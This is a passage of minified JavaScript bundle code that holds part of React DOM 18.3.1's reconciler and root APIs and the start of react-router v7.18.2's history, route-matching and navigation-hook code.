0?s.state:null,cu(e),s.updater=il,e.stateNode=s,s._reactInternals=e,Jc(e,r,t,n),e=td(null,e,r,!0,o,n)):(e.tag=0,Ce&&o&&nu(e),dt(null,e,s,n),e=e.child),e;case 16:r=e.elementType;e:{switch(ta(t,e),t=e.pendingProps,s=r._init,r=s(r._payload),e.type=r,s=e.tag=yb(r),t=qt(r,t),s){case 0:e=ed(null,e,r,t,n);break e;case 1:e=vf(null,e,r,t,n);break e;case 11:e=gf(null,e,r,t,n);break e;case 14:e=xf(null,e,r,qt(r.type,t),n);break e}throw Error(O(306,r,""))}return e;case 0:return r=e.type,s=e.pendingProps,s=e.elementType===r?s:qt(r,s),ed(t,e,r,s,n);case 1:return r=e.type,s=e.pendingProps,s=e.elementType===r?s:qt(r,s),vf(t,e,r,s,n);case 3:e:{if(Sg(e),t===null)throw Error(O(387));r=e.pendingProps,o=e.memoizedState,s=o.element,qm(t,e),Sa(e,r,null,n);var a=e.memoizedState;if(r=a.element,o.isDehydrated)if(o={element:r,isDehydrated:!1,cache:a.cache,pendingSuspenseBoundaries:a.pendingSuspenseBoundaries,transitions:a.transitions},e.updateQueue.baseState=o,e.memoizedState=o,e.flags&256){s=ks(Error(O(423)),e),e=yf(t,e,r,n,s);break e}else if(r!==s){s=ks(Error(O(424)),e),e=yf(t,e,r,n,s);break e}else for(It=Jn(e.stateNode.containerInfo.firstChild),Tt=e,Ce=!0,Jt=null,n=Km(e,null,r,n),e.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if(Ss(),r===s){e=Pn(t,e,n);break e}dt(t,e,r,n)}e=e.child}return e;case 5:return Xm(e),t===null&&Qc(e),r=e.type,s=e.pendingProps,o=t!==null?t.memoizedProps:null,a=s.children,Hc(r,s)?a=null:o!==null&&Hc(r,o)&&(e.flags|=32),wg(t,e),dt(t,e,a,n),e.child;case 6:return t===null&&Qc(e),null;case 13:return Cg(t,e,n);case 4:return du(e,e.stateNode.containerInfo),r=e.pendingProps,t===null?e.child=Cs(e,null,r,n):dt(t,e,r,n),e.child;case 11:return r=e.type,s=e.pendingProps,s=e.elementType===r?s:qt(r,s),gf(t,e,r,s,n);case 7:return dt(t,e,e.pendingProps,n),e.child;case 8:return dt(t,e,e.pendingProps.children,n),e.child;case 12:return dt(t,e,e.pendingProps.children,n),e.child;case 10:e:{if(r=e.type._context,s=e.pendingProps,o=e.memoizedProps,a=s.value,ye(_a,r._currentValue),r._currentValue=a,o!==null)if(on(o.value,a)){if(o.children===s.children&&!St.current){e=Pn(t,e,n);break e}}else for(o=e.child,o!==null&&(o.return=e);o!==null;){var l=o.dependencies;if(l!==null){a=o.child;for(var c=l.firstContext;c!==null;){if(c.context===r){if(o.tag===1){c=En(-1,n&-n),c.tag=2;var d=o.updateQueue;if(d!==null){d=d.shared;var p=d.pending;p===null?c.next=c:(c.next=p.next,p.next=c),d.pending=c}}o.lanes|=n,c=o.alternate,c!==null&&(c.lanes|=n),qc(o.return,n,e),l.lanes|=n;break}c=c.next}}else if(o.tag===10)a=o.type===e.type?null:o.child;else if(o.tag===18){if(a=o.return,a===null)throw Error(O(341));a.lanes|=n,l=a.alternate,l!==null&&(l.lanes|=n),qc(a,n,e),a=o.sibling}else a=o.child;if(a!==null)a.return=o;else for(a=o;a!==null;){if(a===e){a=null;break}if(o=a.sibling,o!==null){o.return=a.return,a=o;break}a=a.return}o=a}dt(t,e,s.children,n),e=e.child}return e;case 9:return s=e.type,r=e.pendingProps.children,gs(e,n),s=Ht(s),r=r(s),e.flags|=1,dt(t,e,r,n),e.child;case 14:return r=e.type,s=qt(r,e.pendingProps),s=qt(r.type,s),xf(t,e,r,s,n);case 15:return bg(t,e,e.type,e.pendingProps,n);case 17:return r=e.type,s=e.pendingProps,s=e.elementType===r?s:qt(r,s),ta(t,e),e.tag=1,Ct(r)?(t=!0,va(e)):t=!1,gs(e,n),xg(e,r,s),Jc(e,r,s,n),td(null,e,r,!0,t,n);case 19:return jg(t,e,n);case 22:return _g(t,e,n)}throw Error(O(156,e.tag))};function $g(t,e){return hm(t,e)}function vb(t,e,n,r){this.tag=t,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=e,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function $t(t,e,n,r){return new vb(t,e,n,r)}function ju(t){return t=t.prototype,!(!t||!t.isReactComponent)}function yb(t){if(typeof t=="function")return ju(t)?1:0;if(t!=null){if(t=t.$$typeof,t===Hd)return 11;if(t===Vd)return 14}return 2}function nr(t,e){var n=t.alternate;return n===null?(n=$t(t.tag,e,t.key,t.mode),n.elementType=t.elementType,n.type=t.type,n.stateNode=t.stateNode,n.alternate=t,t.alternate=n):(n.pendingProps=e,n.type=t.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=t.flags&14680064,n.childLanes=t.childLanes,n.lanes=t.lanes,n.child=t.child,n.memoizedProps=t.memoizedProps,n.memoizedState=t.memoizedState,n.updateQueue=t.updateQueue,e=t.dependencies,n.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext},n.sibling=t.sibling,n.index=t.index,n.ref=t.ref,n}function sa(t,e,n,r,s,o){var a=2;if(r=t,typeof t=="function")ju(t)&&(a=1);else if(typeof t=="string")a=5;else e:switch(t){case es:return Rr(n.children,s,o,e);case Ud:a=8,s|=8;break;case wc:return t=$t(12,n,e,s|2),t.elementType=wc,t.lanes=o,t;case Sc:return t=$t(13,n,e,s),t.elementType=Sc,t.lanes=o,t;case Cc:return t=$t(19,n,e,s),t.elementType=Cc,t.lanes=o,t;case Xh:return ll(n,s,o,e);default:if(typeof t=="object"&&t!==null)switch(t.$$typeof){case Qh:a=10;break e;case qh:a=9;break e;case Hd:a=11;break e;case Vd:a=14;break e;case Bn:a=16,r=null;break e}throw Error(O(130,t==null?t:typeof t,""))}return e=$t(a,n,e,s),e.elementType=t,e.type=r,e.lanes=o,e}function Rr(t,e,n,r){return t=$t(7,t,r,e),t.lanes=n,t}function ll(t,e,n,r){return t=$t(22,t,r,e),t.elementType=Xh,t.lanes=n,t.stateNode={isHidden:!1},t}function rc(t,e,n){return t=$t(6,t,null,e),t.lanes=n,t}function sc(t,e,n){return e=$t(4,t.children!==null?t.children:[],t.key,e),e.lanes=n,e.stateNode={containerInfo:t.containerInfo,pendingChildren:null,implementation:t.implementation},e}function bb(t,e,n,r,s){this.tag=e,this.containerInfo=t,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Ol(0),this.expirationTimes=Ol(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Ol(0),this.identifierPrefix=r,this.onRecoverableError=s,this.mutableSourceEagerHydrationData=null}function ku(t,e,n,r,s,o,a,l,c){return t=new bb(t,e,n,l,c),e===1?(e=1,o===!0&&(e|=8)):e=0,o=$t(3,null,null,e),t.current=o,o.stateNode=t,o.memoizedState={element:r,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},cu(o),t}function _b(t,e,n){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:Zr,key:r==null?null:""+r,children:t,containerInfo:e,implementation:n}}function Bg(t){if(!t)return lr;t=t._reactInternals;e:{if(Wr(t)!==t||t.tag!==1)throw Error(O(170));var e=t;do{switch(e.tag){case 3:e=e.stateNode.context;break e;case 1:if(Ct(e.type)){e=e.stateNode.__reactInternalMemoizedMergedChildContext;break e}}e=e.return}while(e!==null);throw Error(O(171))}if(t.tag===1){var n=t.type;if(Ct(n))return Bm(t,n,e)}return e}function Ug(t,e,n,r,s,o,a,l,c){return t=ku(n,r,!0,t,s,o,a,l,c),t.context=Bg(null),n=t.current,r=pt(),s=tr(n),o=En(r,s),o.callback=e??null,Zn(n,o,s),t.current.lanes=s,ao(t,s,r),jt(t,r),t}function cl(t,e,n,r){var s=e.current,o=pt(),a=tr(s);return n=Bg(n),e.context===null?e.context=n:e.pendingContext=n,e=En(o,a),e.payload={element:t},r=r===void 0?null:r,r!==null&&(e.callback=r),t=Zn(s,e,a),t!==null&&(nn(t,s,a,o),Jo(t,s,a)),a}function Ta(t){if(t=t.current,!t.child)return null;switch(t.child.tag){case 5:return t.child.stateNode;default:return t.child.stateNode}}function If(t,e){if(t=t.memoizedState,t!==null&&t.dehydrated!==null){var n=t.retryLane;t.retryLane=n!==0&&n<e?n:e}}function Nu(t,e){If(t,e),(t=t.alternate)&&If(t,e)}function wb(){return null}var Hg=typeof reportError=="function"?reportError:function(t){console.error(t)};function Eu(t){this._internalRoot=t}dl.prototype.render=Eu.prototype.render=function(t){var e=this._internalRoot;if(e===null)throw Error(O(409));cl(t,e,null,null)};dl.prototype.unmount=Eu.prototype.unmount=function(){var t=this._internalRoot;if(t!==null){this._internalRoot=null;var e=t.containerInfo;Lr(function(){cl(null,t,null,null)}),e[Tn]=null}};function dl(t){this._internalRoot=t}dl.prototype.unstable_scheduleHydration=function(t){if(t){var e=_m();t={blockedOn:null,target:t,priority:e};for(var n=0;n<Hn.length&&e!==0&&e<Hn[n].priority;n++);Hn.splice(n,0,t),n===0&&Sm(t)}};function Iu(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11)}function ul(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11&&(t.nodeType!==8||t.nodeValue!==" react-mount-point-unstable "))}function Rf(){}function Sb(t,e,n,r,s){if(s){if(typeof r=="function"){var o=r;r=function(){var d=Ta(a);o.call(d)}}var a=Ug(e,r,t,0,null,!1,!1,"",Rf);return t._reactRootContainer=a,t[Tn]=a.current,Oi(t.nodeType===8?t.parentNode:t),Lr(),a}for(;s=t.lastChild;)t.removeChild(s);if(typeof r=="function"){var l=r;r=function(){var d=Ta(c);l.call(d)}}var c=ku(t,0,!1,null,null,!1,!1,"",Rf);return t._reactRootContainer=c,t[Tn]=c.current,Oi(t.nodeType===8?t.parentNode:t),Lr(function(){cl(e,c,n,r)}),c}function pl(t,e,n,r,s){var o=n._reactRootContainer;if(o){var a=o;if(typeof s=="function"){var l=s;s=function(){var c=Ta(a);l.call(c)}}cl(e,a,t,s)}else a=Sb(n,e,t,s,r);return Ta(a)}ym=function(t){switch(t.tag){case 3:var e=t.stateNode;if(e.current.memoizedState.isDehydrated){var n=hi(e.pendingLanes);n!==0&&(Kd(e,n|1),jt(e,ze()),!(de&6)&&(Ns=ze()+500,hr()))}break;case 13:Lr(function(){var r=An(t,1);if(r!==null){var s=pt();nn(r,t,1,s)}}),Nu(t,1)}};Qd=function(t){if(t.tag===13){var e=An(t,134217728);if(e!==null){var n=pt();nn(e,t,134217728,n)}Nu(t,134217728)}};bm=function(t){if(t.tag===13){var e=tr(t),n=An(t,e);if(n!==null){var r=pt();nn(n,t,e,r)}Nu(t,e)}};_m=function(){return pe};wm=function(t,e){var n=pe;try{return pe=t,e()}finally{pe=n}};Dc=function(t,e,n){switch(e){case"input":if(Nc(t,n),e=n.name,n.type==="radio"&&e!=null){for(n=t;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+e)+'][type="radio"]'),e=0;e<n.length;e++){var r=n[e];if(r!==t&&r.form===t.form){var s=nl(r);if(!s)throw Error(O(90));Zh(r),Nc(r,s)}}}break;case"textarea":tm(t,n);break;case"select":e=n.value,e!=null&&ps(t,!!n.multiple,e,!1)}};lm=wu;cm=Lr;var Cb={usingClientEntryPoint:!1,Events:[co,ss,nl,om,am,wu]},oi={findFiberByHostInstance:jr,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},jb={bundleType:oi.bundleType,version:oi.version,rendererPackageName:oi.rendererPackageName,rendererConfig:oi.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Mn.ReactCurrentDispatcher,findHostInstanceByFiber:function(t){return t=pm(t),t===null?null:t.stateNode},findFiberByHostInstance:oi.findFiberByHostInstance||wb,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Uo=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Uo.isDisabled&&Uo.supportsFiber)try{Ja=Uo.inject(jb),fn=Uo}catch{}}Pt.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Cb;Pt.createPortal=function(t,e){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!Iu(e))throw Error(O(200));return _b(t,e,null,n)};Pt.createRoot=function(t,e){if(!Iu(t))throw Error(O(299));var n=!1,r="",s=Hg;return e!=null&&(e.unstable_strictMode===!0&&(n=!0),e.identifierPrefix!==void 0&&(r=e.identifierPrefix),e.onRecoverableError!==void 0&&(s=e.onRecoverableError)),e=ku(t,1,!1,null,null,n,!1,r,s),t[Tn]=e.current,Oi(t.nodeType===8?t.parentNode:t),new Eu(e)};Pt.findDOMNode=function(t){if(t==null)return null;if(t.nodeType===1)return t;var e=t._reactInternals;if(e===void 0)throw typeof t.render=="function"?Error(O(188)):(t=Object.keys(t).join(","),Error(O(268,t)));return t=pm(e),t=t===null?null:t.stateNode,t};Pt.flushSync=function(t){return Lr(t)};Pt.hydrate=function(t,e,n){if(!ul(e))throw Error(O(200));return pl(null,t,e,!0,n)};Pt.hydrateRoot=function(t,e,n){if(!Iu(t))throw Error(O(405));var r=n!=null&&n.hydratedSources||null,s=!1,o="",a=Hg;if(n!=null&&(n.unstable_strictMode===!0&&(s=!0),n.identifierPrefix!==void 0&&(o=n.identifierPrefix),n.onRecoverableError!==void 0&&(a=n.onRecoverableError)),e=Ug(e,null,t,1,n??null,s,!1,o,a),t[Tn]=e.current,Oi(t),r)for(t=0;t<r.length;t++)n=r[t],s=n._getVersion,s=s(n._source),e.mutableSourceEagerHydrationData==null?e.mutableSourceEagerHydrationData=[n,s]:e.mutableSourceEagerHydrationData.push(n,s);return new dl(e)};Pt.render=function(t,e,n){if(!ul(e))throw Error(O(200));return pl(null,t,e,!1,n)};Pt.unmountComponentAtNode=function(t){if(!ul(t))throw Error(O(40));return t._reactRootContainer?(Lr(function(){pl(null,null,t,!1,function(){t._reactRootContainer=null,t[Tn]=null})}),!0):!1};Pt.unstable_batchedUpdates=wu;Pt.unstable_renderSubtreeIntoContainer=function(t,e,n,r){if(!ul(n))throw Error(O(200));if(t==null||t._reactInternals===void 0)throw Error(O(38));return pl(t,e,n,!1,r)};Pt.version="18.3.1-next-f1338f8080-20240426";function Vg(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Vg)}catch(t){console.error(t)}}Vg(),Vh.exports=Pt;var kb=Vh.exports,Tf=kb;bc.createRoot=Tf.createRoot,bc.hydrateRoot=Tf.hydrateRoot;/**
 * react-router v7.18.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */var Ru=/^(?:[a-z][a-z0-9+.-]*:|[\\/]{2})/i,Gg=/^[\\/]{2}/;function Nb(t,e){return e+t.replace(/\\/g,"/")}var Af="popstate";function Pf(t){return typeof t=="object"&&t!=null&&"pathname"in t&&"search"in t&&"hash"in t&&"state"in t&&"key"in t}function Eb(t={}){function e(r,s){var d;let o=(d=s.state)==null?void 0:d.masked,{pathname:a,search:l,hash:c}=o||r.location;return fd("",{pathname:a,search:l,hash:c},s.state&&s.state.usr||null,s.state&&s.state.key||"default",o?{pathname:r.location.pathname,search:r.location.search,hash:r.location.hash}:void 0)}function n(r,s){return typeof s=="string"?s:Yi(s)}return Rb(e,n,null,t)}function je(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}function an(t,e){if(!t){typeof console<"u"&&console.warn(e);try{throw new Error(e)}catch{}}}function Ib(){return Math.random().toString(36).substring(2,10)}function Df(t,e){return{usr:t.state,key:t.key,idx:e,masked:t.mask?{pathname:t.pathname,search:t.search,hash:t.hash}:void 0}}function fd(t,e,n=null,r,s){return{pathname:typeof t=="string"?t:t.pathname,search:"",hash:"",...typeof e=="string"?Ms(e):e,state:n,key:e&&e.key||r||Ib(),mask:s}}function Yi({pathname:t="/",search:e="",hash:n=""}){return e&&e!=="?"&&(t+=e.charAt(0)==="?"?e:"?"+e),n&&n!=="#"&&(t+=n.charAt(0)==="#"?n:"#"+n),t}function Ms(t){let e={};if(t){let n=t.indexOf("#");n>=0&&(e.hash=t.substring(n),t=t.substring(0,n));let r=t.indexOf("?");r>=0&&(e.search=t.substring(r),t=t.substring(0,r)),t&&(e.pathname=t)}return e}function Rb(t,e,n,r={}){let{window:s=document.defaultView,v5Compat:o=!1}=r,a=s.history,l="POP",c=null,d=p();d==null&&(d=0,a.replaceState({...a.state,idx:d},""));function p(){return(a.state||{idx:null}).idx}function f(){l="POP";let _=p(),m=_==null?null:_-d;d=_,c&&c({action:l,location:v.location,delta:m})}function u(_,m){l="PUSH";let h=Pf(_)?_:fd(v.location,_,m);d=p()+1;let y=Df(h,d),w=v.createHref(h.mask||h);try{a.pushState(y,"",w)}catch(N){if(N instanceof DOMException&&N.name==="DataCloneError")throw N;s.location.assign(w)}o&&c&&c({action:l,location:v.location,delta:1})}function b(_,m){l="REPLACE";let h=Pf(_)?_:fd(v.location,_,m);d=p();let y=Df(h,d),w=v.createHref(h.mask||h);a.replaceState(y,"",w),o&&c&&c({action:l,location:v.location,delta:0})}function x(_){return Tb(s,_)}let v={get action(){return l},get location(){return t(s,a)},listen(_){if(c)throw new Error("A history only accepts one active listener");return s.addEventListener(Af,f),c=_,()=>{s.removeEventListener(Af,f),c=null}},createHref(_){return e(s,_)},createURL:x,encodeLocation(_){let m=x(_);return{pathname:m.pathname,search:m.search,hash:m.hash}},push:u,replace:b,go(_){return a.go(_)}};return v}function Tb(t,e,n=!1){let r="http://localhost";t&&(r=t.location.origin!=="null"?t.location.origin:t.location.href),je(r,"No window.location.(origin|href) available to create URL");let s=typeof e=="string"?e:Yi(e);return s=s.replace(/ $/,"%20"),!n&&Gg.test(s)&&(s=r+s),new URL(s,r)}function Yg(t,e,n="/"){return Ab(t,e,n,!1)}function Ab(t,e,n,r,s){let o=typeof e=="string"?Ms(e):e,a=Dn(o.pathname||"/",n);if(a==null)return null;let l=Pb(t),c=null,d=Hb(a);for(let p=0;c==null&&p<l.length;++p)c=Ub(l[p],d,r);return c}function Pb(t){let e=Kg(t);return Db(e),e}function Kg(t,e=[],n=[],r="",s=!1){let o=(a,l,c=s,d)=>{let p={relativePath:d===void 0?a.path||"":d,caseSensitive:a.caseSensitive===!0,childrenIndex:l,route:a};if(p.relativePath.startsWith("/")){if(!p.relativePath.startsWith(r)&&c)return;je(p.relativePath.startsWith(r),`Absolute route path "${p.relativePath}" nested under path "${r}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),p.relativePath=p.relativePath.slice(r.length)}let f=rn([r,p.relativePath]),u=n.concat(p);a.children&&a.children.length>0&&(je(a.index!==!0,`Index routes must not have child routes. Please remove all child routes from route path "${f}".`),Kg(a.children,e,u,f,c)),!(a.path==null&&!a.index)&&e.push({path:f,score:$b(f,a.index),routesMeta:u.map((b,x)=>{let[v,_]=Xg(b.relativePath,b.caseSensitive,x===u.length-1);return{...b,matcher:v,compiledParams:_}})})};return t.forEach((a,l)=>{var c;if(a.path===""||!((c=a.path)!=null&&c.includes("?")))o(a,l);else for(let d of Qg(a.path))o(a,l,!0,d)}),e}function Qg(t){let e=t.split("/");if(e.length===0)return[];let[n,...r]=e,s=n.endsWith("?"),o=n.replace(/\?$/,"");if(r.length===0)return s?[o,""]:[o];let a=Qg(r.join("/")),l=[];return l.push(...a.map(c=>c===""?o:[o,c].join("/"))),s&&l.push(...a),l.map(c=>t.startsWith("/")&&c===""?"/":c)}function Db(t){t.sort((e,n)=>e.score!==n.score?n.score-e.score:Bb(e.routesMeta.map(r=>r.childrenIndex),n.routesMeta.map(r=>r.childrenIndex)))}var Lb=/^:[\w-]+$/,zb=3,Mb=2,Ob=1,Fb=10,Wb=-2,Lf=t=>t==="*";function $b(t,e){let n=t.split("/"),r=n.length;return n.some(Lf)&&(r+=Wb),e&&(r+=Mb),n.filter(s=>!Lf(s)).reduce((s,o)=>s+(Lb.test(o)?zb:o===""?Ob:Fb),r)}function Bb(t,e){return t.length===e.length&&t.slice(0,-1).every((r,s)=>r===e[s])?t[t.length-1]-e[e.length-1]:0}function Ub(t,e,n=!1){let{routesMeta:r}=t,s={},o="/",a=[];for(let l=0;l<r.length;++l){let c=r[l],d=l===r.length-1,p=o==="/"?e:e.slice(o.length)||"/",f={path:c.relativePath,caseSensitive:c.caseSensitive,end:d},u=c.matcher&&c.compiledParams?qg(f,p,c.matcher,c.compiledParams):Aa(f,p),b=c.route;if(!u&&d&&n&&!r[r.length-1].route.index&&(u=Aa({path:c.relativePath,caseSensitive:c.caseSensitive,end:!1},p)),!u)return null;Object.assign(s,u.params),a.push({params:s,pathname:rn([o,u.pathname]),pathnameBase:Yb(rn([o,u.pathnameBase])),route:b}),u.pathnameBase!=="/"&&(o=rn([o,u.pathnameBase]))}return a}function Aa(t,e){typeof t=="string"&&(t={path:t,caseSensitive:!1,end:!0});let[n,r]=Xg(t.path,t.caseSensitive,t.end);return qg(t,e,n,r)}function qg(t,e,n,r){let s=e.match(n);if(!s)return null;let o=s[0],a=o.replace(/(.)\/+$/,"$1"),l=s.slice(1);return{params:r.reduce((d,{paramName:p,isOptional:f},u)=>{if(p==="*"){let x=l[u]||"";a=o.slice(0,o.length-x.length).replace(/(.)\/+$/,"$1")}const b=l[u];return f&&!b?d[p]=void 0:d[p]=(b||"").replace(/%2F/g,"/"),d},{}),pathname:o,pathnameBase:a,pattern:t}}function Xg(t,e=!1,n=!0){an(t==="*"||!t.endsWith("*")||t.endsWith("/*"),`Route path "${t}" will be treated as if it were "${t.replace(/\*$/,"/*")}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${t.replace(/\*$/,"/*")}".`);let r=[],s="^"+t.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(a,l,c,d,p)=>{if(r.push({paramName:l,isOptional:c!=null}),c){let f=p.charAt(d+a.length);return f&&f!=="/"?"/([^\\/]*)":"(?:/([^\\/]*))?"}return"/([^\\/]+)"}).replace(/\/([\w-]+)\?(\/|$)/g,"(/$1)?$2");return t.endsWith("*")?(r.push({paramName:"*"}),s+=t==="*"||t==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?s+="\\/*$":t!==""&&t!=="/"&&(s+="(?:(?=\\/|$))"),[new RegExp(s,e?void 0:"i"),r]}function Hb(t){try{return t.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(e){return an(!1,`The URL path "${t}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${e}).`),t}}function Dn(t,e){if(e==="/")return t;if(!t.toLowerCase().startsWith(e.toLowerCase()))return null;let n=e.endsWith("/")?e.length-1:e.length,r=t.charAt(n);return r&&r!=="/"?null:t.slice(n)||"/"}function Vb(t,e="/"){let{pathname:n,search:r="",hash:s=""}=typeof t=="string"?Ms(t):t,o;return n?(n=Jg(n),n.startsWith("/")?o=zf(n.substring(1),"/"):o=zf(n,e)):o=e,{pathname:o,search:Kb(r),hash:Qb(s)}}function zf(t,e){let n=Pa(e).split("/");return t.split("/").forEach(s=>{s===".."?n.length>1&&n.pop():s!=="."&&n.push(s)}),n.length>1?n.join("/"):"/"}function ic(t,e,n,r){return`Cannot include a '${t}' character in a manually specified \`to.${e}\` field [${JSON.stringify(r)}].  Please separate it out to the \`to.${n}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`}function Gb(t){return t.filter((e,n)=>n===0||e.route.path&&e.route.path.length>0)}function Tu(t){let e=Gb(t);return e.map((n,r)=>r===e.length-1?n.pathname:n.pathnameBase)}function fl(t,e,n,r=!1){let s;typeof t=="string"?s=Ms(t):(s={...t},je(!s.pathname||!s.pathname.includes("?"),ic("?","pathname","search",s)),je(!s.pathname||!s.pathname.includes("#"),ic("#","pathname","hash",s)),je(!s.search||!s.search.includes("#"),ic("#","search","hash",s)));let o=t===""||s.pathname==="",a=o?"/":s.pathname,l;if(a==null)l=n;else{let f=e.length-1;if(!r&&a.startsWith("..")){let u=a.split("/");for(;u[0]==="..";)u.shift(),f-=1;s.pathname=u.join("/")}l=f>=0?e[f]:"/"}let c=Vb(s,l),d=a&&a!=="/"&&a.endsWith("/"),p=(o||a===".")&&n.endsWith("/");return!c.pathname.endsWith("/")&&(d||p)&&(c.pathname+="/"),c}var Jg=t=>t.replace(/[\\/]{2,}/g,"/"),rn=t=>Jg(t.join("/")),Pa=t=>t.replace(/\/+$/,""),Yb=t=>Pa(t).replace(/^\/*/,"/"),Kb=t=>!t||t==="?"?"":t.startsWith("?")?t:"?"+t,Qb=t=>!t||t==="#"?"":t.startsWith("#")?t:"#"+t,qb=class{constructor(t,e,n,r=!1){this.status=t,this.statusText=e||"",this.internal=r,n instanceof Error?(this.data=n.toString(),this.error=n):this.data=n}};function Xb(t){return t!=null&&typeof t.status=="number"&&typeof t.statusText=="string"&&typeof t.internal=="boolean"&&"data"in t}function Jb(t){let e=t.map(n=>n.route.path).filter(Boolean);return rn(e)||"/"}var Zg=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u";function ex(t,e){let n=t;if(typeof n!="string"||!Ru.test(n))return{absoluteURL:void 0,isExternal:!1,to:n};let r=n,s=!1;if(Zg)try{let o=new URL(window.location.href),a=Gg.test(n)?new URL(Nb(n,o.protocol)):new URL(n),l=Dn(a.pathname,e);a.origin===o.origin&&l!=null?n=l+a.search+a.hash:s=!0}catch{an(!1,`<Link to="${n}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)}return{absoluteURL:r,isExternal:s,to:n}}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");var tx=["POST","PUT","PATCH","DELETE"];new Set(tx);var Zb=["GET",...tx];new Set(Zb);var e1=["about:","blob:","chrome:","chrome-untrusted:","content:","data:","devtools:","file:","filesystem:","javascript:"];function t1(t){try{return e1.includes(new URL(t).protocol)}catch{return!1}}var Os=g.createContext(null);Os.displayName="DataRouter";var hl=g.createContext(null);hl.displayName="DataRouterState";var nx=g.createContext(!1);function n1(){return g.useContext(nx)}var rx=g.createContext({isTransitioning:!1});rx.displayName="ViewTransition";var r1=g.createContext(new Map);r1.displayName="Fetchers";var s1=g.createContext(null);s1.displayName="Await";var Lt=g.createContext(null);Lt.displayName="Navigation";var po=g.createContext(null);po.displayName="Location";var ln=g.createContext({outlet:null,matches:[],isDataRoute:!1});ln.displayName="Route";var Au=g.createContext(null);Au.displayName="RouteError";var sx="REACT_ROUTER_ERROR",i1="REDIRECT",o1="ROUTE_ERROR_RESPONSE";function a1(t){if(t.startsWith(`${sx}:${i1}:{`))try{let e=JSON.parse(t.slice(28));if(typeof e=="object"&&e&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.location=="string"&&typeof e.reloadDocument=="boolean"&&typeof e.replace=="boolean")return e}catch{}}function l1(t){if(t.startsWith(`${sx}:${o1}:{`))try{let e=JSON.parse(t.slice(40));if(typeof e=="object"&&e&&typeof e.status=="number"&&typeof e.statusText=="string")return new qb(e.status,e.statusText,e.data)}catch{}}function c1(t,{relative:e}={}){je(Fs(),"useHref() may be used only in the context of a <Router> component.");let{basename:n,navigator:r}=g.useContext(Lt),{hash:s,pathname:o,search:a}=fo(t,{relative:e}),l=o;return n!=="/"&&(l=o==="/"?n:rn([n,o])),r.createHref({pathname:l,search:a,hash:s})}function Fs(){return g.useContext(po)!=null}function mn(){return je(Fs(),"useLocation() may be used only in the context of a <Router> component."),g.useContext(po).location}var ix="You should call navigate() in a React.useEffect(), not when your component is first rendered.";function ox(t){g.useContext(Lt).static||g.useLayoutEffect(t)}function gt(){let{isDataRoute:t}=g.useContext(ln);return t?w1():d1()}function d1(){je(Fs(),"useNavigate() may be used only in the context of a <Router> component.");let t=g.useContext(Os),{basename:e,navigator:n}=g.useContext(Lt),{matches:r}=g.useContext(ln),{pathname:s}=mn(),o=JSON.stringify(Tu(r)),a=g.useRef(!1);return ox(()=>{a.current=!0}),g.useCallback((c,d={})=>{if(an(a.current,ix),!a.current)return;if(typeof c=="number"){n.go(c);return}let p=fl(c,JSON.parse(o),s,d.relative==="path");t==null&&e!=="/"&&(p.pathname=p.pathname==="/"?e:rn([e,p.pathname])),(d.replace?n.replace:n.push)(p,d.state,d)},[e,n,o,s,t])}g.createContext(null);function On(){let{matches:t}=g.useContext(ln),e=t[t.length-1];return(e==null?void 0:e.params)??{}}function fo(t,{relative:e}={}){let{matches:n}=g.useContext(ln),{pathname:r}=mn(),s=JSON.stringify(Tu(n));return g.useMemo(()=>fl(t,JSON.parse(s),r,e==="path"),[t,s,r,e])}function u1(t,e){return ax(t,e)}function 